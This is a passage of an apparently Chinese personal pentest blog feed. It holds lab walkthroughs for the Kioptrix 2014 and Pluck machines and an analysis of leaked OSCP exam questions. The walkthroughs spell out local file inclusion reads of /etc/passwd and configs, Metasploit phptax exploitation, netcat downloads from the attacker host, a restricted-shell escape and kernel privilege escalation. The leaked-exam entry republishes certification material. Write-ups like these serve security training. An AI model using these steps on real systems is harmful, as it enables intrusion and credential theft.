title="是否读研"></a>是否读研</h2><p>临近毕业季，相信每一个学子都想过是否要读研吧，我也是一样。经过慎重考虑，我决定先工作，如果工作后遇到瓶颈，想要继续提升，那么读研也为时不晚。</p><p><a href="https://www.zhihu.com/question/21277528">信息安全专业有必要考研吗</a></p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>打算毕业后三年都做渗透测试，至于三年后转安全研究还是继续做渗透，再说吧。</p><p>2020年计划考下oscp，除此之外在拿到的offer的公司工作顺利。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-11-02/20191211134333.jpg"></p><p>没想到转行成功了，真是不可思议。从18岁在图书馆4楼拿起《黑客大曝光》那天起，从没想过22岁可以从事这个行业。</p><p>GOOD LUCK !</p>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kioptrix 2014</title>
    <link href="/2019/12/09/04-x/"/>
    <url>/2019/12/09/04-x/</url>
    
    <content type="html"><![CDATA[<h1 id="Kioptrix-2014"><a href="#Kioptrix-2014" class="headerlink" title="Kioptrix 2014"></a>Kioptrix 2014</h1><p>2:07 开始<br><a href="http://192.168.67.129/">http://192.168.67.129/</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">22</span>/tcp   closed   ssh<br><span class="hljs-number">80</span>/tcp   filtered <span class="hljs-keyword">http</span><br><span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>     <span class="hljs-keyword">http</span>-proxy<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>2:28 web目录扫描，爬行</p><p>查看源码，发现一个地址pChart2.1.3/index.php</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> pchart<br><span class="hljs-attribute">searchsploit</span> -m exploits/php/webapps/<span class="hljs-number">31173</span>.txt<br><span class="hljs-attribute">leafpad</span> <span class="hljs-number">311</span>tab补全命令<br></code></pre></div></td></tr></table></figure><p>exp提示有目录遍历漏洞和反射型xss</p><p><a href="http://192.168.67.129/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../etc/passwd">http://192.168.67.129/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a></p><p>查看apache配置文件</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.67.129</span>/pChart<span class="hljs-number">2</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>/examples/index.php?Action=View&amp;Script=%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>fusr/local/etc/apache<span class="hljs-number">22</span>/httpd.conf<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-09-04/10.PNG" alt="10"><br>经过检查得知，修改user-agent头，可以访问8080端口。</p><p><a href="http://192.168.67.129:8080/phptax/">http://192.168.67.129:8080/phptax/</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-09-04/11.PNG" alt="11"></p><p>找到phptax 远程代码执行，拥有exp<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-09-04/12.PNG" alt="12"></p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">msfconsole<br><span class="hljs-keyword">search</span> phptax<br><span class="hljs-keyword">use</span> 0<br><span class="hljs-keyword">set</span> RHOSTS 192.168.67.129<br><span class="hljs-keyword">set</span> RPORT 8080<br><span class="hljs-keyword">run</span><br></code></pre></div></td></tr></table></figure><p>获得一个www权限的shell</p><h2 id="privelege"><a href="#privelege" class="headerlink" title="privelege"></a>privelege</h2><p>ctrl + z 退出session，记住session编号。</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">search</span> local_exploit<br>use <span class="hljs-number">0</span> <br><span class="hljs-keyword">show</span> options<br><span class="hljs-keyword">set</span> sessions <span class="hljs-number">1</span><br>run<br>[<span class="hljs-operator">*</span>] <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.129</span> <span class="hljs-operator">-</span> Collecting <span class="hljs-keyword">local</span> exploits <span class="hljs-keyword">for</span> cmd<span class="hljs-operator">/</span>unix...<br>[<span class="hljs-operator">*</span>] <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.129</span> <span class="hljs-operator">-</span> <span class="hljs-number">7</span> exploit checks <span class="hljs-keyword">are</span> being tried...<br>[<span class="hljs-operator">*</span>] Post <span class="hljs-keyword">module</span> execution completed<br>失败<br></code></pre></div></td></tr></table></figure><p>没有python、php、wget、curl，但是有nc，gcc</p><hr><p>上传检查脚本</p><p>kali: <code>nc -lnvp 80 &lt; linux-exploit-suggester.sh </code><br>shell: nc kali’sIP 80 &gt; linux.sh<br>运行后还是失败，猜测只有bash才能运行linux-exploit-suggester.sh，而得到的shell类型为sh</p><hr><p>searchsploit freebsd 9<br>上传对应的内核漏洞exp</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-09-04/13.PNG" alt="13"></p><p>4:50结束，其中神游发呆做菜聊天占了绝大部分时间ORZ</p><h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">-n<span class="hljs-type">numeric</span>-<span class="hljs-keyword">only</span> IP addresses, <span class="hljs-keyword">no</span> DNS<br>-v  <span class="hljs-keyword">verbose</span><br>-w secstimeout <span class="hljs-keyword">for</span> connects <span class="hljs-keyword">and</span> final net reads<br> <br>nc -nv <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.67</span> <span class="hljs-number">443</span> -w <span class="hljs-number">5</span> &gt; exploit.c<br></code></pre></div></td></tr></table></figure><p>如果不加-w参数，nc会一直连接，哪怕是传输文件成功了，也不会断开。<br>所以必须加该参数，否则不稳定的shell运行ctrl+c，shell就会没有了。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pluck(本地文件包含+内核漏洞提权)</title>
    <link href="/2019/12/08/11-x/"/>
    <url>/2019/12/08/11-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/pluck-1,178/">靶机下载地址</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">115</span><br><br><br><span class="hljs-attribute">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">3</span>p<span class="hljs-number">1</span> Ubuntu <span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br><span class="hljs-attribute">3306</span>/tcp open  mysql   MySQL (unauthorized)<br><span class="hljs-attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">192.168.1.115</span>  -u root -p<br><span class="hljs-attribute">Enter</span> password: <br><span class="hljs-attribute">ERROR</span> <span class="hljs-number">1130</span> (HY<span class="hljs-number">000</span>): Host &#x27;<span class="hljs-number">192.168.1.102</span>&#x27; is not allowed to connect to this MySQL server<br></code></pre></div></td></tr></table></figure><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p><a href="http://192.168.1.115/index.php?page=contact.php">http://192.168.1.115/index.php?page=contact.php</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/4.PNG" alt="4"></p><p>存在本地文件包含漏洞，可以达到任意文件读取的目的。</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.1.115/index</span>.php?page=<span class="hljs-regexp">/etc/passwd</span><br><br><span class="hljs-symbol">bob:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:bob</span>,,,<span class="hljs-symbol">:/home/bob</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">peter:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/peter</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">paul:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/paul</span><span class="hljs-symbol">:/usr/bin/pdmenu</span><br>backup-<span class="hljs-symbol">user:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:Just</span> to make backups easier,,,<span class="hljs-symbol">:/backups</span><span class="hljs-symbol">:/usr/local/scripts/backup</span>.sh<br>---<br><br><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.1.115/index</span>.php?page=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/scripts/backup</span>.sh<br><br>文件内容如下<br><span class="hljs-comment">#Backup directories in /backups so we can get it via tftp</span><br><br>echo <span class="hljs-string">&quot;Backing up data&quot;</span><br>tar -cf /backups/backup.tar /home /var/www/html &gt; <span class="hljs-regexp">/dev/null</span> <span class="hljs-number">2</span>&amp; &gt; <span class="hljs-regexp">/dev/null</span><br><br>tar -cf是建立备份文档的意思<br>---<br>wget <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.1.115/index</span>.php?page=<span class="hljs-regexp">/backups/backup</span>.tar<br><br>该备份文档只进行了打包，没有压缩，下图可见文件绝对路径。<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/5.PNG" alt="5"></p><p>ssh -i id.rsa paul@IP<br>ssh <a href="mailto:&#112;&#x65;&#x74;&#101;&#x72;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#46;&#x31;&#48;&#51;">&#112;&#x65;&#x74;&#101;&#x72;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#46;&#x31;&#48;&#51;</a><br>无法连接<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/6.PNG" alt="6"></p><p>查看ssh配置<br><a href="http://192.168.1.103/index.php?page=/etc/ssh/sshd_config">http://192.168.1.103/index.php?page=/etc/ssh/sshd_config</a><br>查找<a href="https://whale3070.github.io/training/2019/10/26/07-x/">资料</a>后发现，ssh私钥是这样的格式。</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">-----BEGIN RSA <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br>xxx省略<br>-----<span class="hljs-keyword">END</span> RSA <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></div></td></tr></table></figure><p>而路径中有/home/paul/keys/id_key2、/home/paul/keys/id_key3等等，只有找到正确的ssh私钥才能连接。</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>sql报错注入。因为oscp考试不允许使用自动化利用的工具，于是我特地手动利用，不使用sqlmap。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/3.PNG" alt="3"></p><h3 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h3><p><a href="http://192.168.1.103/index.php?page=php://filter/convert.base64-encode/resource=admin.php">http://192.168.1.103/index.php?page=php://filter/convert.base64-encode/resource=admin.php</a></p><p>关键代码在这一行</p><figure class="highlight smalltalk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smalltalk">if(strpos(<span class="hljs-string">$_</span>POST[<span class="hljs-string">&#x27;email&#x27;</span>], <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) !== <span class="hljs-keyword">false</span>) &#123;<br>echo  <span class="hljs-comment">&quot;&lt;strong&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 6&lt;/strong&gt;&quot;</span>;<br>&#125;else&#123;<br>echo  <span class="hljs-comment">&quot;&lt;strong&gt;Incorrect Username or Password!&lt;/strong&gt;&quot;</span>;<br>&#125;<br><br>strpos — 查找字符串首次出现的位置<br>如果email中存在单引号，就会提示一串sql语法错误。<br></code></pre></div></td></tr></table></figure><h2 id="查看writeup"><a href="#查看writeup" class="headerlink" title="查看writeup"></a>查看writeup</h2><p>以前没有遇到这种ssh登陆错误。</p><p>ssh -v -i id.rsa4 <a href="mailto:&#112;&#97;&#117;&#x6c;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x31;&#x2e;&#x31;&#x30;&#x33;">&#112;&#97;&#117;&#x6c;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x31;&#x2e;&#x31;&#x30;&#x33;</a></p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss">OpenSSH_8<span class="hljs-number">.0</span>p1 Debian<span class="hljs-number">-3</span>, OpenSSL <span class="hljs-number">1.1</span><span class="hljs-number">.1</span>c  <span class="hljs-number">28</span> May <span class="hljs-number">2019</span><br>debug1: Reading configuration data /etc/ssh/ssh_config<br>debug1: /etc/ssh/ssh_config <span class="hljs-keyword">line</span> <span class="hljs-number">19</span>: Applying options <span class="hljs-keyword">for</span> *<br>debug1: Connecting to 192.168.1.103 [192.168.1.103] port 22.<br>debug1: Connection established.<br>debug1: identity file id.rsa4 type -1<br>debug1: identity file id.rsa4-cert type -1<br>debug1: Local version string SSH-2.0-OpenSSH_8.0p1 Debian-3<br>debug1: Remote protocol version 2.0, remote software version OpenSSH_7.3p1 Ubuntu-1<br>debug1: match: OpenSSH_7.3p1 Ubuntu-1 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002<br>debug1: Authenticating to 192.168.1.103:22 as &#x27;paul&#x27;<br>debug1: SSH2_MSG_KEXINIT sent<br>debug1: SSH2_MSG_KEXINIT received<br>debug1: kex: algorithm: curve25519-sha256<span class="hljs-comment">@libssh.org</span><br><span class="hljs-comment">debug1: kex: host key algorithm: rsa-sha2-512</span><br><span class="hljs-comment">debug1: kex: server-&gt;client cipher: chacha20-poly1305@</span>openssh.com MAC: &lt;implicit&gt; compression: none<br>debug1: kex: client-&gt;server cipher: chacha20-poly1305<span class="hljs-comment">@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="hljs-comment">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="hljs-comment">debug1: Server host key: ssh-rsa SHA256:6k4RLcLMdnm7mjtP4Kh+t6wSWNuYpHtRT3tkINCk1wY</span><br><span class="hljs-comment">@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><br><span class="hljs-comment">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@@</span><span class="hljs-comment">@</span><br><span class="hljs-comment">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="hljs-comment">Someone could be eavesdropping on you right now (man-in-the-middle attack)!</span><br><span class="hljs-comment">It is also possible that a host key has just been changed.</span><br><span class="hljs-comment">The fingerprint for the RSA key sent by the remote host is</span><br><span class="hljs-comment">SHA256:6k4RLcLMdnm7mjtP4Kh+t6wSWNuYpHtRT3tkINCk1wY.</span><br><span class="hljs-comment">Please contact your system administrator.</span><br><span class="hljs-comment">Add correct host key in /root/.ssh/known_hosts to get rid of this message.</span><br><span class="hljs-comment">Offending RSA key in /root/.ssh/known_hosts:1</span><br><span class="hljs-comment">  remove with:</span><br><span class="hljs-comment">  ssh-keygen -f &quot;/root/.ssh/known_hosts&quot; -R &quot;192.168.1.103&quot;</span><br><span class="hljs-comment">RSA host key for 192.168.1.103 has changed and you have requested strict checking.</span><br><span class="hljs-comment">Host key verification failed.</span><br></code></pre></div></td></tr></table></figure><p>ssh-keygen -f “/root/.ssh/known_hosts” -R “192.168.1.103”</p><p>只要根据提示，删除以前的记录即可。可能是因为以前也使用过相同的ip进行ssh无密码登陆，而这个是不同的主机，所以登陆失败了。</p><p>删除记录后再次尝试登陆，ssh会提示是否保存记录，我们输入yes。</p><p>登陆成功。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/7.PNG" alt="7"></p><h2 id="突破限制的shell"><a href="#突破限制的shell" class="headerlink" title="突破限制的shell"></a>突破限制的shell</h2><p>ssh登陆后，是一个限制权限的shell，只能运行上述图片中的功能。</p><p>选择edit file，然后输入/tmp，这是一个存在的目录。<br>使用的是vi编辑器来编辑文件。</p><p>输入</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">:<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">shell</span>=/bin/bash<br>:shell<br></code></pre></div></td></tr></table></figure><p>于是获得了paul权限的/bin/bash</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/8.PNG" alt="8"></p><p>有哪些方法突破有限制的shell?</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>uname -a<br>Linux pluck 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</p><p>上传linux-exploit-suggester.sh</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-08-11/9.PNG" alt="9"></p><p>dirtycow内核漏洞提权。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oscp真题解析</title>
    <link href="/2019/12/06/02-x/"/>
    <url>/2019/12/06/02-x/</url>
    
    <content type="html"><![CDATA[<p>由于微信公众号文章的不稳定性，我收藏的某些文章竟然提示已经被作者删除。由于国内的网络安全法，所以遇到微信公众号上的好文章最好保存到本地，以免过段时间去看就已经被删掉了。</p><p>本地的学习资料是oscp泄露的<a href="https://whale3070.github.io/reference/2019/12/03/OSCP%25E7%259C%259F%25E9%25A2%2598%25E6%25B3%2584%25E9%259C%25B2/">真题</a>（稳定性起见，已经放在我自己的博客上做个备份了，如有侵权请联系我进行删除），但在考试环境中已经移除，但是对于体验oscp考点还是比较有帮助。</p><h2 id="OutOfBox"><a href="#OutOfBox" class="headerlink" title="OutOfBox"></a><strong>OutOfBox</strong></h2><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ul><li><a href="https://www.cnblogs.com/me80/p/7464125.html">nfs 原理</a></li><li><a href="https://wiki.jikexueyuan.com/project/linux/nfs.html">NFS 服务配置</a></li><li><a href="https://www.freebuf.com/articles/network/159468.html">针对NFS的渗透测试</a></li><li><a href="https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions">linux-privilege-escalation-using-weak-nfs-permissions</a></li><li><a href="https://bbs.pediy.com/thread-222518.htm">Linux NFS 提权</a></li></ul><h3 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h3><p>（80端口）文件包含漏洞+（22端口）ssh弱密码，拿到一个用户权限。<br>（2049端口）nfs共享的目录有<strong>写权限</strong>。通过写入一个调用/bin/bash的c代码，然后编译，添加suid权限，由于nfs<strong>权限配置不当</strong>，是no_root_squash，所以本地以root权限添加到共享目录的c程序，也具有root权限。运行该c程序，即可提权到最高权限，获得root shell。</p><p><strong>nfs是网络文件系统的英文缩写，nsf协议能使user访问其他计算机犹如使用自己的计算机一样。更详细的资料请查看参考资料</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">showmount </span>命令用于查询nsf服务器<br><span class="hljs-keyword">showmount </span>-e IP 列出指定nsf服务器输出目录列表<br></code></pre></div></td></tr></table></figure><h3 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h3><p>通过shodan查找nfs服务器，运用学到的命令查看服务器共享目录。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-06-02/1.PNG" alt="1"></p><p>mount.nfs: access denied by server 是什么原因。由于服务器经验不够，没遇到过类似的。也许是没有访问权限。</p><h3 id="nfs协议可能的漏洞"><a href="#nfs协议可能的漏洞" class="headerlink" title="nfs协议可能的漏洞"></a>nfs协议可能的漏洞</h3><p>与此台机器类似的<a href="https://whale3070.github.io/2017/12/04/Vulnix-nfs%E6%8F%90%E6%9D%83/">Vulnix——nfs提权</a>，总结一下nfs协议常见的漏洞。</p><p>nsf协议默认开放端口是2049，并且还会随机开放小于1024的端口，用于文件传输等作用。也就说，文件传输协议会使用不止一个端口。</p><h4 id="1-nfs版本漏洞"><a href="#1-nfs版本漏洞" class="headerlink" title="1.nfs版本漏洞"></a>1.nfs版本漏洞</h4><p><code>searchsploit nfs | grep -v &#39;dos&#39; | grep -v &#39;windows&#39;</code></p><h4 id="2-权限配置不当"><a href="#2-权限配置不当" class="headerlink" title="2.权限配置不当"></a>2.权限配置不当</h4><p>应该使用root_squash配置，而不是no_root_squash。</p><p><strong>cat /etc/exports</strong> 可以查看配置</p><p>no_root_squash ：加上这个选项后，root用户就会对共享的目录拥有至高的权限控制，就像是对本机的目录操作一样。不安全，不建议使用</p><h4 id="3-共享目录可写"><a href="#3-共享目录可写" class="headerlink" title="3.共享目录可写"></a>3.共享目录可写</h4><p>如果共享.ssh目录，就可以写入ssh密钥，从而无密码登陆</p><h4 id="4-敏感信息泄露"><a href="#4-敏感信息泄露" class="headerlink" title="4.敏感信息泄露"></a>4.敏感信息泄露</h4><p>泄露用户名信息可以结合暴力破解弱密码，从而登陆。</p><h2 id="Ph33r-machine"><a href="#Ph33r-machine" class="headerlink" title="Ph33r machine"></a><strong>Ph33r machine</strong></h2><p>clam av存在代码执行漏洞，找到msf exp，执行即可拿到root权限</p><h2 id="Admin-pc"><a href="#Admin-pc" class="headerlink" title="Admin-pc"></a><strong>Admin-pc</strong></h2><p>windows机器：ftp匿名访问，获得敏感信息。用户名密码的hash，这里考察hash破解。</p><p>通过用户名密码进入web后台，上传php反弹shell，获得普通用户权限。提权：上传jsp webshell到c:/xampp/tomcat/webapps/examples目录，获得最高权限。</p><p>这里注意，不同目录，权限不同。</p><h2 id="unreal-tournament"><a href="#unreal-tournament" class="headerlink" title="unreal tournament"></a><strong>unreal tournament</strong></h2><p>软件版本漏洞，找到exp，修改exp并执行。考点：替换shellcode</p><h2 id="UCAL"><a href="#UCAL" class="headerlink" title="UCAL"></a><strong>UCAL</strong></h2><p>nikto扫描到web后台，找到对应exp，获得shell。linux本地漏洞提权。</p><h2 id="OFFENSIV-W2K3"><a href="#OFFENSIV-W2K3" class="headerlink" title="OFFENSIV-W2K3"></a><strong>OFFENSIV-W2K3</strong></h2><p>web存在php远程命令执行漏洞，反弹获得shell。通过应用软件的配置文件获得口令。windows udf提权。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于操作系统，oscp考察linux和windows，我猜应该是一半一半，linux 2台/windows 